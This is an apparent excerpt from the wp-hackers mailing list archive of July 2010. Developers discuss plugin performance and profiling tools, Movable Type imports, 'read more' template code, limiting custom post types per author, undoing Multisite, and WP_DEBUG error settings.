On 2010-07-18, at 6:52 AM, mailapera <mailapera at gmail.com> wrote:

> How many plugins can a WP installation bare? What is a reasonable number?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From spellham at flowershopnetwork.com  Sun Jul 18 14:07:10 2010
From: spellham at flowershopnetwork.com (Steve Pellham)
Date: Sun, 18 Jul 2010 09:07:10 -0500
Subject: [wp-hackers] Redirect Exploit
In-Reply-To: <4C429630.1090201@visser.name>
References: <AANLkTimJH1Nzn9y5j-lX8vQqpmQGxslMP6N8uFdRcuSe@mail.gmail.com>
	<4C429630.1090201@visser.name>
Message-ID: <AANLkTimSdeTIDMTw25n8Wrt7Gws8LasXHVy2GWfm7MVq@mail.gmail.com>

On Jul 18, 2010 12:51 AM, "Jeremy Visser" <jeremy at visser.name> wrote:

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Edward de Leau said: > I just found out that all my wp sites were a victim
of: > http://wiki.mediat...
Unfortunately that is only cleaning up the mess that the attacker did.
It does not remove the attack vector that was used to crack your site in
the first place, which is where you really want to be focusing your efforts.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iEYEARECAAYFAkxCliUACgkQvs6Qqs8TxBpHkgCfTVGEC9KwJgDSnTjGLzg5ghPo
8PgAoJnzQozeW7jB7sJ+dBj25Agy1DuD
=HA5S
-----END PGP SIGNATURE-----

_______________________________________________ wp-hackers mailing list
wp-hackers at lists.automattic....

From wp-hackers at striderweb.com  Sun Jul 18 17:04:04 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sun, 18 Jul 2010 12:04:04 -0500
Subject: [wp-hackers] How many plugins can a WP installation bare?
In-Reply-To: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
References: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
Message-ID: <49C03200-55A3-44EC-AE3C-804B02768073@striderweb.com>

On Jul 18, 2010, at 5:52 AM, mailapera wrote:

> How many plugins can a WP installation bare? What is a reasonable number?


Theoretically, any plugin will slow down WordPress at least a tiny bit -- imperceptibly, perhaps -- in that at the the very least it is include()ing a file even if that file does absolutely nothing.

The real answer to you question is that it completely depends on the plugins.  Some plugins are one line long and do one small thing.  Some plugin are huge and have a significant effect all throughout WordPress.  Many of those small ones might not add up to the overhead of one great big one.

Stephen

P.S. -- I think you meant "bear", not "bare"


From admin at laptoptips.ca  Sun Jul 18 18:34:21 2010
From: admin at laptoptips.ca (Andrew Ozz)
Date: Sun, 18 Jul 2010 11:34:21 -0700
Subject: [wp-hackers] Moving from Movabletype to Wordpress cuts entries
 and	and titels
In-Reply-To: <4C42BA63.3010803@gokboet.nu>
References: <4C42BA63.3010803@gokboet.nu>
Message-ID: <4C43492D.7060108@laptoptips.ca>

On 18/07/2010 1:25 AM, Carina wrote:
> I am totally new to Wordpress and I am trying to import blogs from MT to
> WP. It does not work. I am using the export feature from MT and import
> feature in WP but only parts of everything gets imported. Is there a way
> I can do this using the database or is there something that is just
> missing.

If the MT export file is very large you can split it into several files 
and import them one by one, just be careful to split on post boundaries 
using a text editing program that can handle large files (not Word or 
Notepad).

Another problem you might encounter is some invalid UTF-8 chars in the 
export file especially if the MT blog has been around for many years and 
was running on earlier versions of MT. Unfortunately there's no a 
straightforward fix for this. You can try splitting the export file at 
the post where these chars stop and then using iconv or similar to fix them.

> I need to preserve permalinks some way or another and I guess many of
> you have a great solution to this.

WordPress has pretty flexible permalink settings that would let you add 
".html" to the end, etc. There are many good tutorials on that.


From otto at ottodestruct.com  Sun Jul 18 23:07:58 2010
From: otto at ottodestruct.com (Otto)
Date: Sun, 18 Jul 2010 18:07:58 -0500
Subject: [wp-hackers] How many plugins can a WP installation bare?
In-Reply-To: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
References: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
Message-ID: <AANLkTik_1B6ys_z3qzEhmUvNXwO9cAGq6mlOk4NKPi10@mail.gmail.com>

On Sun, Jul 18, 2010 at 5:52 AM, mailapera <mailapera at gmail.com> wrote:
> How many plugins can a WP installation bare? What is a reasonable number?

I run upwards of 60. It really doesn't make a whole lot of difference.

There is no upper limit.

-Otto

From team at socialriver.org  Mon Jul 19 03:08:29 2010
From: team at socialriver.org (SocialRiver Team)
Date: Sun, 18 Jul 2010 21:08:29 -0600
Subject: [wp-hackers] How many plugins can a WP installation bare?
In-Reply-To: <AANLkTik_1B6ys_z3qzEhmUvNXwO9cAGq6mlOk4NKPi10@mail.gmail.com>
References: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
	<AANLkTik_1B6ys_z3qzEhmUvNXwO9cAGq6mlOk4NKPi10@mail.gmail.com>
Message-ID: <4C43C1AD.4090205@socialriver.org>


  On Sun, Jul 18, 2010 at 5:52 AM, mailapera<mailapera at gmail.com>  wrote:

>> How many plugins can a WP installation bare? What is a reasonable
>> number?

> On 07/18/2010 05:07 PM, Otto wrote:

> I run upwards of 60. It really doesn't make a whole lot of
> difference.
>
> There is no upper limit.

Agreed. What matters most is what the plugins do. Some are very database 
intensive, others rely on third-party sites that might introduce lag 
time in page rendering - etc. So it's possible to only use 1 plugin and 
that plugin might totally drag a site down. Or you could run 100 and the 
site might run really great.

______________________________________________
Scott - Team Developer
SocialRiver - http://socialriver.org

From mailapera at gmail.com  Mon Jul 19 11:52:06 2010
From: mailapera at gmail.com (mailapera)
Date: Mon, 19 Jul 2010 13:52:06 +0200
Subject: [wp-hackers] How many plugins can a WP installation bare?
In-Reply-To: <4C43C1AD.4090205@socialriver.org>
References: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com> 
	<AANLkTik_1B6ys_z3qzEhmUvNXwO9cAGq6mlOk4NKPi10@mail.gmail.com> 
	<4C43C1AD.4090205@socialriver.org>
Message-ID: <AANLkTik82vBudjj7lUusxLs2OAEoa4RAsqqtl0Dbr8W8@mail.gmail.com>

Thank you all. I sensed this was the case, and I sort of dreaded the
answers as this leaves me with no clue on what plugin is more DB
intensive or slowing down page loading. Of course I have an idea that
large plugins also are DB intensive, but I would like to have a more
definite idea.

To get an answer to what plugin is more DB intensive, is there an
analyzer plugin that nicely outputs all significant data regarding the
DB query activity, or do I have to go scrambling in search of this
data with a shell client?

Thanks again




On Mon, Jul 19, 2010 at 5:08 AM, SocialRiver Team <team at socialriver.org> wrote:
>
> ?On Sun, Jul 18, 2010 at 5:52 AM, mailapera<mailapera at gmail.com> ?wrote:
>
>>> How many plugins can a WP installation bare? What is a reasonable
>>> number?
>
>> On 07/18/2010 05:07 PM, Otto wrote:
>
>> I run upwards of 60. It really doesn't make a whole lot of
>> difference.
>>
>> There is no upper limit.
>
> Agreed. What matters most is what the plugins do. Some are very database
> intensive, others rely on third-party sites that might introduce lag time in
> page rendering - etc. So it's possible to only use 1 plugin and that plugin
> might totally drag a site down. Or you could run 100 and the site might run
> really great.
>
> ______________________________________________
> Scott - Team Developer
> SocialRiver - http://socialriver.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From piemanek at gmail.com  Mon Jul 19 12:00:15 2010
From: piemanek at gmail.com (Simon Blackbourn)
Date: Mon, 19 Jul 2010 13:00:15 +0100
Subject: [wp-hackers] How many plugins can a WP installation bare?
In-Reply-To: <AANLkTik82vBudjj7lUusxLs2OAEoa4RAsqqtl0Dbr8W8@mail.gmail.com>
References: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
	<AANLkTik_1B6ys_z3qzEhmUvNXwO9cAGq6mlOk4NKPi10@mail.gmail.com>
	<4C43C1AD.4090205@socialriver.org>
	<AANLkTik82vBudjj7lUusxLs2OAEoa4RAsqqtl0Dbr8W8@mail.gmail.com>
Message-ID: <AANLkTikv7k3MKSgZjKL3RdvQ96LP0cLErlCwtZTBJKmE@mail.gmail.com>

> is there an analyzer plugin that nicely outputs all significant data
> regarding the DB query activity



http://wordpress.org/extend/plugins/debug-queries/

From shikakaa at gmail.com  Mon Jul 19 12:01:04 2010
From: shikakaa at gmail.com (Andras Stracz)
Date: Mon, 19 Jul 2010 14:01:04 +0200
Subject: [wp-hackers] How many plugins can a WP installation bare?
In-Reply-To: <AANLkTik82vBudjj7lUusxLs2OAEoa4RAsqqtl0Dbr8W8@mail.gmail.com>
References: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com> 
	<AANLkTik_1B6ys_z3qzEhmUvNXwO9cAGq6mlOk4NKPi10@mail.gmail.com> 
	<4C43C1AD.4090205@socialriver.org>
	<AANLkTik82vBudjj7lUusxLs2OAEoa4RAsqqtl0Dbr8W8@mail.gmail.com>
Message-ID: <AANLkTik5F17TRMRMBgm71JwfnDO0sEx2Xrxu7RiCKSz3@mail.gmail.com>

I suggest trying WP-Tuner and similar plugins, I have a good experience with
it.

However I must say db intensity is not the only thing that matters. There
are simply badly designed plugins that load everything on every pageload
even if they aren't needed in the end. These would ultimately show up in PHP
profilers (like Xdebug) and with php's get_included_files() function.

Recently I've replaced 2 very badly designed plugins, and for both of them
the database time was less than 7 ms, but they included 30+ files, used up
10+MB memory and ran about 100ms worth of functions. These only showed up in
the combination of these tools.

Maybe some kind of performance or efficiency rating would be useful in the
plugin database, as I belive more and more users grow conscious of pageload
times and minification can only get you so far...

Andras Stracz

On Mon, Jul 19, 2010 at 13:52, mailapera <mailapera at gmail.com> wrote:

> Thank you all. I sensed this was the case, and I sort of dreaded the
> answers as this leaves me with no clue on what plugin is more DB
> intensive or slowing down page loading. Of course I have an idea that
> large plugins also are DB intensive, but I would like to have a more
> definite idea.
>
> To get an answer to what plugin is more DB intensive, is there an
> analyzer plugin that nicely outputs all significant data regarding the
> DB query activity, or do I have to go scrambling in search of this
> data with a shell client?
>
> Thanks again
>
>
>
>
> On Mon, Jul 19, 2010 at 5:08 AM, SocialRiver Team <team at socialriver.org>
> wrote:
> >
> >  On Sun, Jul 18, 2010 at 5:52 AM, mailapera<mailapera at gmail.com>  wrote:
> >
> >>> How many plugins can a WP installation bare? What is a reasonable
> >>> number?
> >
> >> On 07/18/2010 05:07 PM, Otto wrote:
> >
> >> I run upwards of 60. It really doesn't make a whole lot of
> >> difference.
> >>
> >> There is no upper limit.
> >
> > Agreed. What matters most is what the plugins do. Some are very database
> > intensive, others rely on third-party sites that might introduce lag time
> in
> > page rendering - etc. So it's possible to only use 1 plugin and that
> plugin
> > might totally drag a site down. Or you could run 100 and the site might
> run
> > really great.
> >
> > ______________________________________________
> > Scott - Team Developer
> > SocialRiver - http://socialriver.org
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jasperfrumau at gmail.com  Mon Jul 19 12:01:14 2010
From: jasperfrumau at gmail.com (Jasper Frumau)
Date: Mon, 19 Jul 2010 16:01:14 +0400
Subject: [wp-hackers] Read more link on page going nowhere
Message-ID: <AANLkTik5ORBDEMLWgFVI8ohqXzUX3IRYgPfhJPQ7xePA@mail.gmail.com>

Hello everyone,

I have been trying to get a working "read more" tag on a page or pages. So
far I have only managed to get the read more text to show as a link. I have
been writing about it here:
http://wordpress.org/support/topic/424684?replies=13#post-1605389  for a
while now. It has been a monologue so far. I am using the code pasted here
http://wordpress.pastebin.com/f2xeiD4A as well as in the mentioned
wordpress.org thread. Somehow the link keeps on sending visitors back to the
same page showing the text until the "read more" link. I have no idea how I
can fix this. Does anyone know why

<?php
//The Query
query_posts('pagename=portfolio');
global $more;
?>
<?php while (have_posts()) : the_post(); ?>
<?php $more = 0;?>
<div class="post" id="post-<?php the_ID(); ?>">
<h2><?php the_title(); ?></h2>
<div class="entry">

<?php the_content('read the rest of this page ?'); ?>

it does not work and creats a link
http://www.domain.com/portfolio/#more-16that leads to nowhere? Can
this be remedied? Other solutions?

Thanks in advance for any help. Been at it for quite some time now..

Regards,

Jasper

From KrisY at tbs.uk.com  Mon Jul 19 12:04:29 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Mon, 19 Jul 2010 13:04:29 +0100
Subject: [wp-hackers] Read more link on page going nowhere
In-Reply-To: <AANLkTik5ORBDEMLWgFVI8ohqXzUX3IRYgPfhJPQ7xePA@mail.gmail.com>
References: <AANLkTik5ORBDEMLWgFVI8ohqXzUX3IRYgPfhJPQ7xePA@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E30DB@tbs-sbs01.TBS.local>

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jasper Frumau
Sent: 19 July 2010 13:01
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] Read more link on page going nowhere

Hello everyone,

I have been trying to get a working "read more" tag on a page or pages. So
far I have only managed to get the read more text to show as a link. I have
been writing about it here:
http://wordpress.org/support/topic/424684?replies=13#post-1605389  for a
while now. It has been a monologue so far. I am using the code pasted here
http://wordpress.pastebin.com/f2xeiD4A as well as in the mentioned
wordpress.org thread. Somehow the link keeps on sending visitors back to the
same page showing the text until the "read more" link. I have no idea how I
can fix this. Does anyone know why

<?php
//The Query
query_posts('pagename=portfolio');
global $more;
?>
<?php while (have_posts()) : the_post(); ?>
<?php $more = 0;?>
<div class="post" id="post-<?php the_ID(); ?>">
<h2><?php the_title(); ?></h2>
<div class="entry">

<?php the_content('read the rest of this page ?'); ?>

it does not work and creats a link
http://www.domain.com/portfolio/#more-16that leads to nowhere? Can
this be remedied? Other solutions?

Thanks in advance for any help. Been at it for quite some time now..

Regards,

Jasper

-----

Hi there Jasper, I recommend using the_excerpt. Whether you're doing this for posts or pages, the functionality can be replicated. Most simple way of separating a post/page content block from a 'teaser'.

http://codex.wordpress.org/Excerpt

Kris


From yojoaquin at gmail.com  Mon Jul 19 15:08:41 2010
From: yojoaquin at gmail.com (Joaquin Rodriguez Montero)
Date: Mon, 19 Jul 2010 12:08:41 -0300
Subject: [wp-hackers] Limit number of post_type published by user
Message-ID: <AANLkTimUOMVs3AuHgoAjwev3wLMIPmVy__UvqP3WfUZc@mail.gmail.com>

Hi guys,

I'm driving mad finding out how could I achieve this. Say I have a custom
post_type "Listings" and I want each registered author to be allowed to
publish just 1 entry of this type, is that possible?

A work around (just thought about it before sending this email) will be to
create a new entry "Listing" automatically for every new author and allow
him to edit that one (as it'll be assigned to him that shouldn't be a
problem) and won't allow him to publish a new one.. but it's tricky..

Thanks!

Chocks

From wphackers at jakemgold.myfastmail.com  Mon Jul 19 15:22:47 2010
From: wphackers at jakemgold.myfastmail.com (Jake Goldman)
Date: Mon, 19 Jul 2010 11:22:47 -0400
Subject: [wp-hackers] Limit number of post_type published by user
In-Reply-To: <AANLkTimUOMVs3AuHgoAjwev3wLMIPmVy__UvqP3WfUZc@mail.gmail.com>
References: <AANLkTimUOMVs3AuHgoAjwev3wLMIPmVy__UvqP3WfUZc@mail.gmail.com>
Message-ID: <4C446DC7.4070705@jakemgold.myfastmail.com>

  You could theoretically hook the "new post" admin page header (and 
save post to be safe), check whether the current user already has a post 
of that post type, and redirect / wp_die or otherwise "handle" an event 
where they do.

The action hooks to look for are "load-post-new.php" and "save_post".

Just a pointer in the general direction.

Jake


On 7/19/2010 11:08 AM, Joaquin Rodriguez Montero wrote:
> Hi guys,
>
> I'm driving mad finding out how could I achieve this. Say I have a custom
> post_type "Listings" and I want each registered author to be allowed to
> publish just 1 entry of this type, is that possible?
>
> A work around (just thought about it before sending this email) will be to
> create a new entry "Listing" automatically for every new author and allow
> him to edit that one (as it'll be assigned to him that shouldn't be a
> problem) and won't allow him to publish a new one.. but it's tricky..
>
> Thanks!
>
> Chocks
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ashishsainiashfame at gmail.com  Mon Jul 19 16:01:46 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Mon, 19 Jul 2010 21:31:46 +0530
Subject: [wp-hackers] Removing WordPress Multisite data
Message-ID: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com>

Hello everyone,

I need to ask how do I remove all the multisite data to revert back to the
previous state?

I removed 6 tables from the database and lines added into the wp-config.php
but I am stuck at this message "*Warning:* An existing WordPress network was
detected."

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame

From bulk at thecodecave.com  Mon Jul 19 16:14:40 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Mon, 19 Jul 2010 12:14:40 -0400
Subject: [wp-hackers] Removing WordPress Multisite data
In-Reply-To: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com>
Message-ID: <005301cb275d$7f2712a0$7d7537e0$@com>

When are you getting this error?  Are you trying to convert the site back to
multisite again or are you running the install process again? That error
should only occur during initial wp/network setup..

______________________________________________
Brian Layman
eHermits, Inc.
TheCodeCave.com?/?eHermitsInc.com?/?twitter.com/BrianLayman /
facebook.com/eHermit


From ashishsainiashfame at gmail.com  Mon Jul 19 16:29:23 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Mon, 19 Jul 2010 21:59:23 +0530
Subject: [wp-hackers] Removing WordPress Multisite data
In-Reply-To: <005301cb275d$7f2712a0$7d7537e0$@com>
References: <AANLkTilFtqEdpAFF9fQJSpwY89qrSwwu1KXNeHhJEjhM@mail.gmail.com> 
	<005301cb275d$7f2712a0$7d7537e0$@com>
Message-ID: <AANLkTimTemgEW2RAGseu3M4aZFd5EC5JRNTwuZEpkoyn@mail.gmail.com>

Hi Brian,

I am fixing up a client's site where Multisite refused to work for some
reason. I am not sure whats stuck where.

I am looking for a way by which I can revert the installation back i.e. the
things Multisite feature may have added.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Mon, Jul 19, 2010 at 9:44 PM, Brian Layman <bulk at thecodecave.com> wrote:

> When are you getting this error?  Are you trying to convert the site back
> to
> multisite again or are you running the install process again? That error
> should only occur during initial wp/network setup..
>
> ______________________________________________
> Brian Layman
> eHermits, Inc.
> TheCodeCave.com / eHermitsInc.com / twitter.com/BrianLayman /
> facebook.com/eHermit
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Mon Jul 19 16:33:43 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 19 Jul 2010 11:33:43 -0500 (CDT)
Subject: [wp-hackers] Read more link on page going nowhere
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E30DB@tbs-sbs01.TBS.local>
References: <AANLkTik5ORBDEMLWgFVI8ohqXzUX3IRYgPfhJPQ7xePA@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E30DB@tbs-sbs01.TBS.local>
Message-ID: <E5AF348E-73DD-4B11-9404-FECCC5EA1587@newclarity.net>

I replied to you forum post.

-Mike

On Jul 19, 2010, at 8:04 AM, "Kris Young" <KrisY at tbs.uk.com> wrote:

> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jasper Frumau
> Sent: 19 July 2010 13:01
> To: wp-hackers at lists.automattic.com
> Subject: [wp-hackers] Read more link on page going nowhere
> 
> Hello everyone,
> 
> I have been trying to get a working "read more" tag on a page or pages. So
> far I have only managed to get the read more text to show as a link. I have
> been writing about it here:
> http://wordpress.org/support/topic/424684?replies=13#post-1605389  for a
> while now. It has been a monologue so far. I am using the code pasted here
> http://wordpress.pastebin.com/f2xeiD4A as well as in the mentioned
> wordpress.org thread. Somehow the link keeps on sending visitors back to the
> same page showing the text until the "read more" link. I have no idea how I
> can fix this. Does anyone know why
> 
> <?php
> //The Query
> query_posts('pagename=portfolio');
> global $more;
> ?>
> <?php while (have_posts()) : the_post(); ?>
> <?php $more = 0;?>
> <div class="post" id="post-<?php the_ID(); ?>">
> <h2><?php the_title(); ?></h2>
> <div class="entry">
> 
> <?php the_content('read the rest of this page ?'); ?>
> 
> it does not work and creats a link
> http://www.domain.com/portfolio/#more-16that leads to nowhere? Can
> this be remedied? Other solutions?
> 
> Thanks in advance for any help. Been at it for quite some time now..
> 
> Regards,
> 
> Jasper
> 
> -----
> 
> Hi there Jasper, I recommend using the_excerpt. Whether you're doing this for posts or pages, the functionality can be replicated. Most simple way of separating a post/page content block from a 'teaser'.
> 
> http://codex.wordpress.org/Excerpt
> 
> Kris
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From jer at simianuprising.com  Mon Jul 19 18:25:54 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Mon, 19 Jul 2010 14:25:54 -0400
Subject: [wp-hackers] How many plugins can a WP installation bare?
In-Reply-To: <AANLkTik5F17TRMRMBgm71JwfnDO0sEx2Xrxu7RiCKSz3@mail.gmail.com>
References: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
	<AANLkTik_1B6ys_z3qzEhmUvNXwO9cAGq6mlOk4NKPi10@mail.gmail.com>
	<4C43C1AD.4090205@socialriver.org>
	<AANLkTik82vBudjj7lUusxLs2OAEoa4RAsqqtl0Dbr8W8@mail.gmail.com>
	<AANLkTik5F17TRMRMBgm71JwfnDO0sEx2Xrxu7RiCKSz3@mail.gmail.com>
Message-ID: <AANLkTinK5EcC72Qxc06KYZnFmKDQpi66NUh9fI-2d1GI@mail.gmail.com>

On Mon, Jul 19, 2010 at 8:01 AM, Andras Stracz <shikakaa at gmail.com> wrote:

> I suggest trying WP-Tuner and similar plugins, I have a good experience
> with
> it.
>

+1 for WP Tuner, it is a very useful tool that quickly gives you a ton of
information for profiling plugins and is very configurable to show more
detail if necessary (slow queries? All queries? What constitutes slow?)

http://wordpress.org/extend/plugins/wptuner/

Unfortunately the repo votes for it make it seem like 3.0 isn't supported. I
haven't tried it with 3.0 yet.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From jer at simianuprising.com  Mon Jul 19 18:56:28 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Mon, 19 Jul 2010 14:56:28 -0400
Subject: [wp-hackers] DEBUG config and blocking notices
In-Reply-To: <AANLkTil17PpL3pdd-xERHTL9hUoGpk1dOUUYwyetz7KH@mail.gmail.com>
References: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com>
	<AANLkTil17PpL3pdd-xERHTL9hUoGpk1dOUUYwyetz7KH@mail.gmail.com>
Message-ID: <AANLkTilvzyXDAF9bl1iYXyAyyIaWbgZL2dDAgswwD2DW@mail.gmail.com>

On Fri, Jul 16, 2010 at 11:07 AM, scribu <scribu at gmail.com> wrote:

> On Fri, Jul 16, 2010 at 6:04 PM, Andrew Gray <andrew at graymerica.com>
> wrote:
>
> > Does anyone have a good solutions to have wordpress only show fatal
> errors
> > and not show Notices when I turn the wp-config DEBUG variable on.
>
> Well, you could use PHP's error_reporting() function directly.
>
> Also, adding ini_set('display_errors', true); is usually enough.
>
>
I agree with scribu. If you don't want notices then you shouldn't be using
WP_DEBUG. It seems to have been designed to be as hardcore as possbile, and
by using notices it enforces strict programming practices that PHP by
default doesn't dictate. If you just want fatal errors to show on the screen
you should turn them on directly in wp-config, the following works for me:

ini_set('display_errors', 1);
error_reporting (E_ALL);
ini_set('display_startup_errors','1');

You can change E_ALL depending on the level you want.

IMHO developing with WP_DEBUG on is a good idea because if you don't then if
someone runs your code with WP_DEBUG they will not be able to use their
site, and will have to fix all the notices first. Speficially, running
WP_DEBUG is pretty much mandatory for any core development because all the
core devs have it turned on, and any notices screw up execution and fill the
output with errors. The main problem with WP_DEBUG is all the notices
generated by plugins that you didn't write (and all the time you spend
emaling plugin authors with ridiculously simple patches they could use to
fix their plugins).

Writing your own code to not generate notices is easy and good for business
in all kinds of ways. The process of declaring/checking your variables
before use leads you to avoid a lot of mysterious and rare bugs down the
line, and helps you clean up your code in the process.

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From wp at andrewnacin.com  Mon Jul 19 19:02:18 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 19 Jul 2010 15:02:18 -0400
Subject: [wp-hackers] DEBUG config and blocking notices
In-Reply-To: <AANLkTilvzyXDAF9bl1iYXyAyyIaWbgZL2dDAgswwD2DW@mail.gmail.com>
References: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com> 
	<AANLkTil17PpL3pdd-xERHTL9hUoGpk1dOUUYwyetz7KH@mail.gmail.com> 
	<AANLkTilvzyXDAF9bl1iYXyAyyIaWbgZL2dDAgswwD2DW@mail.gmail.com>
Message-ID: <AANLkTilbDRsv2VkQ4qzLvV2si5vjxpqXO-C1933w8in8@mail.gmail.com>

On Mon, Jul 19, 2010 at 2:56 PM, Jeremy Clarke <jer at simianuprising.com>
 wrote:

> If you don't want notices then you shouldn't be using WP_DEBUG.


But you should want notices. Just saying.

Speficially, running WP_DEBUG is pretty much mandatory for any core
> development

because all the core devs have it turned on


Also true.

Writing your own code to not generate notices is easy and good for business

in all kinds of ways. The process of declaring/checking your variables

before use leads you to avoid a lot of mysterious and rare bugs down the

line, and helps you clean up your code in the process.


+1000.

From mikeschinkel at newclarity.net  Tue Jul 20 01:33:09 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 19 Jul 2010 21:33:09 -0400
Subject: [wp-hackers] DEBUG config and blocking notices
In-Reply-To: <AANLkTilbDRsv2VkQ4qzLvV2si5vjxpqXO-C1933w8in8@mail.gmail.com>
References: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com>
	<AANLkTil17PpL3pdd-xERHTL9hUoGpk1dOUUYwyetz7KH@mail.gmail.com>
	<AANLkTilvzyXDAF9bl1iYXyAyyIaWbgZL2dDAgswwD2DW@mail.gmail.com>
	<AANLkTilbDRsv2VkQ4qzLvV2si5vjxpqXO-C1933w8in8@mail.gmail.com>
Message-ID: <3EAEEC24-1D9D-430D-A0E1-893254637B38@newclarity.net>

On Jul 19, 2010, at 3:02 PM, Andrew Nacin wrote:
> On Mon, Jul 19, 2010 at 2:56 PM, Jeremy Clarke <jer at simianuprising.com>
> wrote:
> 
>> If you don't want notices then you shouldn't be using WP_DEBUG.
> 
> But you should want notices. Just saying.
> 
> Speficially, running WP_DEBUG is pretty much mandatory for any core
>> development
> 
> because all the core devs have it turned on
> 
> Also true.
> 
> Writing your own code to not generate notices is easy and good for business
> in all kinds of ways. The process of declaring/checking your variables
> before use leads you to avoid a lot of mysterious and rare bugs down the
> line, and helps you clean up your code in the process.

Andrew & Jeremy,

I can't speak for Andrew Gray but I think one of the reasons he might be interested in just errors is because that many (most?) plugins were not developed with WP_DEBUG and spew lots of errors.  So while it may be a great idea to use WP_DEBUG when hacking on core or building a plugin in a vacuum, it is often impractical when working on plugins or themes on real world website implementations.  So in general I (am rarely in a position where I can) develop with it.

OTOH I'd really *prefer* to using WP_DEBUG but what is stopping me are the plugins the client wants or needs that were not coded with WP_DEBUG.  Part of the problem is that very few places recommend WP_DEBUG (I didn't even learn about it until a few months ago by reading someone else's off-hand remark on the hackers list) but more importantly there is no place in the WordPress.org repositories where a plugin or  theme can be lauded for their use of WP_DEBUG.  For the "3.org" refresh, Is there a way we can automatically verify which plugins actually do support WP_DEBUG and which do not?  That would go a huge way towards allowing us to actually use WP_DEBUG when developing for real world implementations

-Mike
P.S. I tried it again and it seems that it even throughs errors in core code (or at least it seems that way.)  The following error came from my call to add_submenu_page() in an admin_menu hook:

Notice: has_cap was called with an argument that is <strong>deprecated</strong> since version 2.0! Usage of user levels by plugins and themes is deprecated. Use roles and capabilities instead. in /Users/mikeschinkel/Sites/client/trunk/wp-includes/functions.php on line 3321

Call Stack:
    0.0007     740168   1. {main}() /Users/mikeschinkel/Sites/client/trunk/wp-admin/admin.php:0
    0.3520   32696800   2. require('/Users/mikeschinkel/Sites/client/trunk/wp-admin/menu.php') /Users/mikeschinkel/Sites/client/trunk/wp-admin/admin.php:93
    0.3663   32754208   3. do_action() /Users/mikeschinkel/Sites/client/trunk/wp-admin/menu.php:328
    0.3671   32738840   4. call_user_func_array() /Users/mikeschinkel/Sites/client/trunk/wp-includes/plugin.php:395
    0.3671   32738872   5. WP_InitializeSite::admin_menu() /Users/mikeschinkel/Sites/client/trunk/wp-includes/plugin.php:0
    0.3671   32739264   6. add_submenu_page() /Users/mikeschinkel/Sites/client/trunk/wp-content/plugins/wp-initialize-site/wp-initialize-site.php:67
    0.3672   32739840   7. current_user_can() /Users/mikeschinkel/Sites/client/trunk/wp-admin/includes/plugin.php:929
